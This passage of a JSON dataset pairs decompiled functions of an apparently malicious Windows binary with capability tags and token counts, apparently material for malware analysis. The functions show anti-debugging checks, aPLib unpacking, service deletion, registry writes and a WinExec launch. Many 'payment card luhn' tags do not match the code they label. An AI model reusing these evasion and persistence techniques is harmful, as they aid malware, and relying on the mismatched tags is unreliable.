{\n            puVar3 = &stack0xfffffee8;\n            iVar2 = param_1;\n        }\n        *unaff_EDI = *unaff_ESI;\n        *(puVar3 + -4) = 0x8be181d0;\n        *0x8be06e55 = *0x8be06e55 | extraout_CL;\n        pcVar1 = *(iVar2 + 0x50);\n        puVar4 = puVar3 + -8;\n        *(puVar3 + -8) = 0x40424f;\n        (*pcVar1)();\n        puVar5 = puVar4 + -4;\n        *(puVar4 + -4) = 0x404255;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        if (iVar2 != 0) {\n            *(puVar5 + -4) = extraout_ECX;\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 624
    },
    "00403a50": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403c88) overlaps instruction at (ram,0x00403c86)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __fastcall fcn.00403a50(uint param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint16_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint8_t uVar8;\n    uint8_t extraout_CL;\n    ushort extraout_CX;\n    uint8_t uVar9;\n    char extraout_CH;\n    char extraout_CH_00;\n    char extraout_CH_01;\n    uint extraout_ECX;\n    char extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    uint16_t *extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar12;\n    uint16_t in_SS;\n    bool in_CF;\n    bool bVar13;\n    uchar uVar14;\n    bool bVar15;\n    char cVar16;\n    char cVar17;\n    ulong uVar18;\n    uint arg_10h;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint32_t uVar19;\n    uint *puVar20;\n    uint uVar21;\n    uint32_t arg_14h;\n    uint in_stack_ffffffe8;\n    ushort in_stack_ffffffec;\n    ushort in_stack_ffffffee;\n    ushort in_stack_fffffff0;\n    ushort in_stack_fffffff2;\n    \n    if ((in_CF) || (!in_CF)) {\n        in_stack_fffffff0 = 0x11;\n        in_stack_fffffff2 = 0;\n        in_stack_ffffffec = 0x6010;\n        in_stack_ffffffee = 0x40;\n        in_stack_ffffffe8 = 9;\n    }\n    uVar10 = unaff_EBP + 0x68116a76;\n    *(in_EAX + 0x40) = *(in_EAX + 0x40) + (in_EAX >> 8);\n    puVar1 = param_2 + 9;\n    uVar9 = param_1 >> 8;\n    bVar13 = CARRY1(*puVar1, uVar9);\n    *puVar1 = *puVar1 + uVar9;\n    fcn.00402190(0x410584, in_stack_ffffffe8, CONCAT22(in_stack_ffffffee, in_stack_ffffffec), \n                 CONCAT22(in_stack_fffffff2, in_stack_fffffff0));\n    if ((bVar13) || (iVar6 = extraout_EDX,  !bVar13)) {\n        iVar6 = 0xd;\n        in_stack_ffffffdc = 0x406270;\n        in_stack_ffffffd8 = 9;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    *(extraout_EDX + 9) = *(extraout_EDX + 9) + extraout_CH;\n    fcn.00402190(0x410584, in_stack_ffffffd8, in_stack_ffffffdc, iVar6);\n    fcn.00402190(0x410584, 9, 0x406280, 0x1a);\n    cVar17 = SBORROW1(extraout_DL, 'Q');\n    cVar16 = extraout_DL + -0x51 < '\\0';\n    bVar13 = extraout_DL == 'Q';\n    uVar21 = 0x403aef;\n    fcn.00402190(0x410584, 9, 0x4062d4, 10);\n    if ((bVar13 || cVar17 != cVar16) || (!bVar13 && cVar17 == cVar16)) {\n        uVar21 = 0xb;\n    }\n    uVar19 = 0x4062e0;\n    fcn.00402190(0x410584, 9, 0x4062e0, uVar21);\n    fcn.00402190(0x410584, 9, 0x4062ec, 8);\n    uVar3 = fcn.00402190(0x410584, 9, 0x4062f4, 9);\n    uVar3 = (uVar3 & 0xff | ((uVar3 >> 8) - uVar10) + 0x4d << 8) & 0x26ae;\n    cVar17 = SBORROW2(uVar3, 1);\n    cVar16 = uVar3 - 1 < 0;\n    uVar14 = uVar3 == 1;\n    fcn.00402190(0x410584, 9, 0x406300, 9);\n    if ((cVar17 == cVar16) && (cVar17 != cVar16)) {\n        cVar17 = SBORROW4(extraout_EDX_00, 0xc68096a);\n        iVar4 = (extraout_EDX_00 & 3) - (*extraout_EDX_00 & 3);\n        uVar14 = 0 < iVar4;\n        *extraout_EDX_00 = *extraout_EDX_00 + (extraout_EDX_00 < 0xc68096a) * iVar4;\n        arg_14h = uVar10;\n    }\n    else {\n        arg_14h = 9;\n        uVar19 = 0x40630c;\n    }\n    fcn.00402190(0x410584, 9, uVar19, arg_14h);\n    puVar12 = unaff_ESI;\n    if ((!uVar14) && (uVar14)) {\n        puVar12 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    arg_10h = 9;\n    uVar21 = 0x410584;\n    fcn.00402190(0x410584, 9, 0x406318, 0xc);\n    if ((!cVar17) && (cVar17)) {\n        LOCK();\n        puVar12 = 0x138b2633;\n    }\n    fcn.00402190(0x410584, 9, 0x406440, 3);\n    fcn.00402190(0x410584, 9, 0x406444, 10);\n    fcn.00402190(0x410584, 9, 0x406450, 0x1b);\n    puVar20 = uVar19 & 0xffff0000 | in_SS;\n    uVar18 = fcn.00402190(0x410584, 9, 0x40646c, 0x47);\n    while( true ) {\n        uVar9 = uVar18 >> 0x20;\n        uVar3 = (CONCAT11((uVar18 >> 8) + -0x2b, uVar18) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar18 >> 0x28 | uVar9, uVar9);\n        bVar13 = uVar3 < 0x4001;\n        cVar17 = SBORROW2(uVar3, 0x4001);\n        cVar16 = uVar3 + 0xbfff < 0;\n        bVar15 = uVar3 == 0x4001;\n        fcn.00402190(0x410584, 9, 0x410584, 0x40);\n        if ((bVar13 || bVar15) || (!bVar13 && !bVar15)) break;\n        if (!cVar17) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar5 = in(0xff);\n        uVar18 = CONCAT44(extraout_EDX_01, uVar5);\n        *(unaff_EBP + -0x459e74c6) = *(unaff_EBP + -0x459e74c6) + 1;\n    }\n    iVar6 = fcn.00402190(0x410584, 9, 0x4064c0, 0xc);\n    if ((cVar17 != cVar16) || (uVar19 = uVar10,  cVar17 == cVar16)) {\n        uVar19 = 0xb;\n        arg_10h = 0x4064cc;\n        uVar21 = 9;\n    }\n    pcVar2 = iVar6 + 9;\n    *pcVar2 = *pcVar2 + extraout_CH_00;\n    bVar13 = (POPCOUNT(*pcVar2) & 1U) == 0;\n    fcn.00402190(0x410584, uVar21, arg_10h, uVar19);\n    if ((!bVar13) && (bVar13)) {\n        puVar12 = &stack0xffffffbc;\n        cVar16 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *unaff_EBP;\n            cVar16 = cVar16 + -1;\n        } while ('\\0' < cVar16);\n        uVar21 = in(0x78);\n        return uVar21;\n    }\n    fcn.00402190(0x410584, 9, 0x4064d8, 4);\n    cVar16 = fcn.00402190(0x410584, 9, 0x4064dc, 4);\n    bVar13 = false;\n    bVar15 = cVar16 == -0x36;\n    uVar18 = fcn.00402190(0x410584, 9, 0x4064e0, 0xc);\n    puVar7 = uVar18;\n    if (!bVar13 && !bVar15) {\n        uVar10 = uVar10 & 0xffff00ff;\n    }\n    *puVar20 = *puVar12;\n    in(uVar18 >> 0x20);\n    pcVar2 = (uVar18 >> 0x20) + 9;\n    *pcVar2 = *pcVar2 + extraout_CH_01;\n    puVar7[-1] = 0x410584;\n    puVar7[-2] = 0x403dae;\n    uVar18 = fcn.00402190(puVar7[-1], *puVar7, puVar7[1], puVar7[2]);\n    puVar7[6] = uVar18;\n    puVar7[5] = extraout_ECX;\n    puVar7[4] = uVar18 >> 0x20;\n    puVar7[3] = uVar10 & 0xffff0000 | CONCAT11(0xdf, uVar10);\n    puVar7[2] = puVar7 + 7;\n    puVar7[1] = 0x6ae181d0;\n    *puVar7 = puVar12 + 1;\n    puVar7[-1] = puVar20 + 1;\n    uVar21 = puVar7[3];\n    puVar7[6] = 9;\n    puVar7[5] = 0x4064f0;\n    puVar7[4] = 9;\n    puVar7[3] = 0x410584;\n    puVar7[2] = 0x403dcc;\n    iVar4 = fcn.00402190(puVar7[3], puVar7[4], puVar7[5], puVar7[6]);\n    puVar7[6] = uVar21;\n    uVar9 = (uVar21 ^ 0x70c5) - iVar4 >> 8 | extraout_CX >> 8;\n    uVar8 = extraout_CX;\n    cVar17 = SBORROW1(uVar9, uVar8);\n    cVar16 = uVar9 - uVar8 < '\\0';\n    bVar13 = uVar9 == uVar8;\n    puVar7[6] = 0x16;\n    puVar7[5] = 0x4064fc;\n    puVar7[4] = 9;\n    puVar7[3] = 0x410584;\n    puVar7[2] = 0x403df7;\n    iVar6 = fcn.00402190(puVar7[3], puVar7[4], puVar7[5], puVar7[6]);\n    if ((bVar13 || cVar17 != cVar16) || (!bVar13 && cVar17 == cVar16)) {\n        puVar11 = puVar7 + 2;\n        puVar7[2] = 7;\n    }\n    else {\n        *(iVar6 + 0x6a39da56) = *(iVar6 + 0x6a39da56) ^ extraout_CL;\n        puVar11 = puVar7 + 4;\n    }\n    puVar11[-1] = 0x406514;\n    puVar11[-2] = 9;\n    puVar11[-3] = 0x410584;\n    puVar11[-4] = 0x403e1c;\n    uVar21 = fcn.00402190(puVar11[-3], puVar11[-2], puVar11[-1], *puVar11);\n    return uVar21;\n}\n",
        "token_count": 3103
    },
    "00403e30": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f6c) overlaps instruction at (ram,0x00403f6a)\n// \n\nint32_t __cdecl fcn.00403e30(uchar *arg_8h, char *arg_ch, uint *arg_10h, char **arg_14h)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint16_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint32_t extraout_ECX;\n    uint32_t uVar8;\n    char *in_EDX;\n    uint unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    uint16_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uchar *unaff_EDI;\n    bool bVar14;\n    char in_SF;\n    bool bVar15;\n    char in_OF;\n    bool bVar16;\n    bool bVar17;\n    \n    puVar9 = &stack0xfffffffc;\n    pcVar6 = arg_ch;\n    if (((in_OF == in_SF) && (in_OF != in_SF)) && (pcVar6 = in_EDX,  arg_8h = unaff_EDI,  -0x74f3ba76 < in_EDX)) {\n        if (in_EDX < -0x74f3ba75) {\n            *in_EDX = *in_EDX + in_EDX;\n        }\n    }\n    else {\n        in_EDX = fcn.004040d0(0, arg_8h, pcVar6 + 1 >> 1);\n        unaff_EDI = arg_8h;\n    }\n    uVar12 = in_EDX & 0xffff;\n    iVar7 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar8 = extraout_ECX & 0xffff;\n    puVar10 = *(iVar7 + 0x58);\n    if (uVar12 < puVar10) {\n        bVar14 = false;\n        uVar12 = uVar12 - puVar10 & 0xffff;\n        bVar16 = SBORROW4(uVar12, 1);\n        uVar12 = uVar12 - 1;\n    }\n    else {\n        uVar8 = puVar10 & 0xffff;\n        bVar14 = uVar12 < uVar8;\n        bVar16 = SBORROW4(uVar12, uVar8);\n        uVar12 = uVar12 - uVar8;\n    }\n    uVar11 = uVar12;\n    if ((bVar16) || (!bVar16)) {\n        uVar8 = puVar10 >> 0x10;\n        uVar5 = puVar10 >> 0x10;\n        bVar16 = uVar11 < uVar5;\n        bVar17 = SBORROW2(uVar11, uVar5);\n        bVar15 = uVar11 - uVar5 < 0;\n        bVar14 = uVar11 == uVar5;\n    }\n    else {\n        uVar2 = in(puVar10);\n        *unaff_EDI = uVar2;\n        if (!bVar14 && uVar12 != 0) {\n            puVar1 = CONCAT31(unaff_EBX >> 8, 0xbc) + 0x5e5f1055;\n            *puVar1 = *puVar1 | uVar8;\n            arg_10h = puVar10;\n            goto code_r0x00403f72;\n        }\n        uVar8 = 0xe8c1c28b;\n        puVar1 = uVar12 + 0x3b;\n        uVar3 = *puVar1 - 0x3e;\n        bVar16 = 0x3d < *puVar1 || CARRY1(uVar3, bVar14);\n        bVar17 = SCARRY1(*puVar1, -0x3e) != SCARRY1(uVar3, bVar14);\n        *puVar1 = uVar3 + bVar14;\n        bVar15 = *puVar1 < '\\0';\n        bVar14 = *puVar1 == 0;\n        LOCK();\n    }\n    if (bVar16) {\n        if (!bVar14 && bVar17 == bVar15) {\n            uVar12 = uVar12 & 0xffff;\n        }\n        iVar13 = (uVar12 - uVar8 & 0xffff) - 1;\n    }\n    else {\n        iVar13 = uVar12 - (uVar8 & 0xffff);\n    }\n    bVar14 = (POPCOUNT(arg_ch + iVar13 & 0xff) & 1U) != 0;\n    *arg_14h = arg_ch + iVar13;\n    if ((bVar14) && (!bVar14)) {\n        puVar10 = &stack0xffffffe8;\n        cVar4 = '\\x1e';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar9;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n        iVar7 = in(0x78);\n        return iVar7;\n    }\ncode_r0x00403f72:\n    *arg_10h = *(iVar7 + 0x58);\n    return iVar7;\n}\n",
        "token_count": 1213
    },
    "00401220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401220(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 185
    },
    "00401350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013c9) overlaps instruction at (ram,0x004013c5)\n// \n\nbool fcn.00401350(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    unkbyte10 extraout_ST0;\n    ulong uVar4;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar4 = fcn.00401220(0x80000001, 0x40629c, 0x4062c8, &var_8h, &var_10ch, &var_4h);\n    piVar2 = uVar4 >> 0x20;\n    iVar1 = uVar4;\n    if (iVar1 == 0) {\n        return false;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        *(iVar1 + -0x7ce92414) = extraout_ST0;\n        *piVar2 = *piVar2 + -0x7a72207c;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.004012d0(&var_10ch);\n    return iVar1 != -1;\n}\n",
        "token_count": 404
    },
    "004015d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.004015d0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint16_t in_CX;\n    int32_t extraout_ECX;\n    uint extraout_EDX;\n    uint unaff_EBX;\n    uint8_t in_AF;\n    uchar uVar2;\n    char cVar3;\n    char cVar4;\n    uint64_t uVar5;\n    uint unaff_retaddr;\n    uint *puVar6;\n    \n    cVar4 = false;\n    cVar3 = (in_CX | 0x31fd) < 0;\n    uVar2 = (in_CX | 0x31fd) == 0;\n    puVar6 = NULL;\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((!cVar4) && (cVar4)) {\n        *puVar6 = unaff_retaddr;\n        return CONCAT44(unaff_EBX, unaff_retaddr);\n    }\n    uVar5 = fcn.004020a0(arg_8h_00, arg_8h);\n    if ((!uVar2 && cVar4 == cVar3) && (uVar2 || cVar4 != cVar3)) {\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        return uVar5 & 0xffffffff00000000 |\n               uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    }\n    uVar1 = fcn.004048b0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return CONCAT44(extraout_EDX, uVar1);\n}\n",
        "token_count": 489
    },
    "00401660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401660(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00403e30(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00403e30(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 163
    },
    "00401940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004019a6) overlaps instruction at (ram,0x004019a4)\n// \n// WARNING: Removing unreachable block (ram,0x00401a06)\n// WARNING: Removing unreachable block (ram,0x004019a3)\n// WARNING: Removing unreachable block (ram,0x004019a8)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401940(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint8_t uVar1;\n    uint8_t uStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uStack20 = param_4 * '\\x02';\n    iStack12 = 0;\n    if (0 < param_4) {\n        iStack16 = 1;\n        do {\n            uVar1 = *(iStack16 % param_2 + param_1);\n            *(param_5 + -1 + iStack16) = uStack20 ^ *(iStack12 + param_3) ^ *((iStack16 + -1) % param_2 + param_1);\n            *(iStack16 + param_5) = uStack20 ^ uVar1;\n            iStack12 = iStack12 + 1;\n            iStack16 = iStack16 + 2;\n        } while (iStack12 < param_4);\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "00401c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401db6) overlaps instruction at (ram,0x00401db3)\n// \n\nint32_t __fastcall fcn.00401c40(uint param_1, uint param_2, uint param_3)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uchar *arg_ch;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar7;\n    uint arg_8h;\n    uchar uVar8;\n    bool bVar9;\n    char cVar10;\n    uint64_t uVar11;\n    unkbyte6 Var12;\n    uchar uVar13;\n    ushort uVar14;\n    uint noname_1;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack16;\n    uchar auStack12 [8];\n    \n    puVar6 = &stack0xfffffffc;\n    uStack276 = 0;\n    puVar7 = &uStack535;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack16 = 1;\n    puVar7 = &uStack275;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uVar8 = (CONCAT11(param_2 >> 8 | param_2, param_2) ^ 0x5165) < 0x4001;\n    noname_1 = 0x104;\n    iVar5 = unaff_ESI;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    iVar3 = (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276, 0x30, 0xe8);\n    if ((uVar8) || (!uVar8)) {\n        arg_ch = auStack12;\n    }\n    else {\n        arg_ch = iVar3 + 0x7c8ecb0d + (uVar8 == false);\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8d27e95e;\n        puVar6 = &stack0xfffffffd;\n    }\n    fcn.00402750(puVar6 + -4, arg_ch);\n    iVar3 = *(puVar6 + 0xc);\n    Var12 = fcn.00402a80(param_3, iVar3, *(puVar6 + 0x10), *(puVar6 + 0x14), *(puVar6 + -4), *(puVar6 + -8));\n    if (Var12 == 0) {\n        return 0;\n    }\n    bVar9 = ((CONCAT11((Var12 >> 8) + -0x2b, Var12) ^ 0x3d) + 0x7c28 ^\n            (Var12 >> 0x20 & 0xff | (Var12 >> 0x28 | Var12 >> 0x20) << 8)) < 0x4001;\n    *0x41e5b8 = fcn.00401b50();\n    if (!bVar9) {\n        if (bVar9) {\n            out(0xbd, *0x41e5b8);\n            return *0x41e5b8;\n        }\n    }\n    iVar4 = fcn.00402f90(puVar6 + -0x110, 0x406044, *(puVar6 + -4), *(puVar6 + -8), *0x41e5b8 == 0);\n    bVar9 = iVar4 == 0;\n    if (bVar9) {\n        return 0;\n    }\n    if ((!bVar9) && (bVar9)) {\n        LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar8 = 0xc2;\n    uVar13 = 0x1d;\n    uVar14 = 0x40;\n    uVar11 = fcn.00401f60();\n    cVar10 = 0xfffffffb < &stack0xfffffdd0;\n    if (cVar10) {\ncode_r0x00401dde:\n        uVar11 = fcn.00402240();\n        uVar8 = uVar11 >> 0x20;\n        uVar13 = uVar11 >> 0x28;\n        uVar14 = uVar11 >> 0x30;\n    }\n    else {\n        uVar11 = uVar11 & 0xffffffffff;\n        if (!cVar10) goto code_r0x00401dde;\n    }\n    puVar2 = iVar3 + 0x43d1773a;\n    *puVar2 = *puVar2 ^ 0xe827e95e;\n    iVar3 = CONCAT22(uVar14, CONCAT11(uVar13, uVar8));\n    pcVar1 = uVar11 + (cVar10 == '\\0') + 0x7c8ecb5f;\n    *pcVar1 = *pcVar1 + (uVar11 >> 0x20);\n    iVar4 = fcn.00402bc0(0x406068);\n    if (iVar4 == -1) {\n        iVar4 = fcn.00402bc0(0x40605c);\n        if (iVar4 == -1) goto code_r0x00401e53;\n        arg_8h = 0xf;\n    }\n    else {\n        arg_8h = 0xe;\n    }\n    iVar4 = fcn.00402210(param_3);\n    if (iVar4 != 0) {\n        fcn.00403000();\n        fcn.00401000(arg_8h);\n        return 1;\n    }\ncode_r0x00401e53:\n    iVar4 = fcn.004015d0(param_3, iVar3 + -0x110);\n    if (iVar4 == 0) {\n        *(iVar3 + -0xc) = 0;\n    }\n    if (*(iVar3 + -0xc) != 0) {\n        iVar5 = fcn.004032d0(param_3, noname_1, unaff_EDI, iVar5);\n        if (iVar5 == 0) {\n            *(iVar3 + -0xc) = 0;\n        }\n    }\n    iVar5 = *(iVar3 + -0xc);\n    if (iVar5 == 0) {\n        iVar5 = fcn.00402cc0(*(iVar3 + 8), 0);\n        *(iVar3 + -0xc) = iVar5;\n    }\n    if (iVar5 != 0) {\n        fcn.00401000(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x7c);\n    return iVar5;\n}\n",
        "token_count": 1665
    },
    "00401f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401f2a)\n\nvoid fcn.00401f00(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41e5b4 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41e5b4 = 1;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "004020a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402103) overlaps instruction at (ram,0x004020ff)\n// \n// WARNING: Removing unreachable block (ram,0x004020f4)\n\nuint __cdecl fcn.004020a0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_EDI;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n    if (iVar1 != 0) {\n        *unaff_EDI = iVar1 + 4;\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x56b8ec44);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "00402210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402210(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402cc0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00402240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00402240(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00404190(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x406204, 0x406244, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 259
    },
    "004022d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004022d0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00402310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040233c) overlaps instruction at (ram,0x0040233b)\n// \n\nvoid __cdecl fcn.00402310(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX_00;\n    uint *unaff_EDI;\n    bool bVar3;\n    \n    if (arg_ch != 1) goto code_r0x00402357;\n    bVar3 = false;\n    iVar1 = fcn.00403340();\n    if (bVar3) {\ncode_r0x0040233c:\n        fcn.004027d0();\n        iVar1 = *0x41e5b8;\n        iVar2 = extraout_ECX_00;\n    }\n    else {\n        iVar2 = extraout_ECX;\n        if (!bVar3) goto code_r0x0040233c;\n    }\n    arg_ch = 5;\n    *unaff_EDI = *0x1;\n    *(iVar2 + 0x41e5b8) = *(iVar2 + 0x41e5b8) + (iVar1 + 1 >> 8);\n    if (iVar1 + 1 == 0) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        fcn.00403030();\n    }\ncode_r0x00402357:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    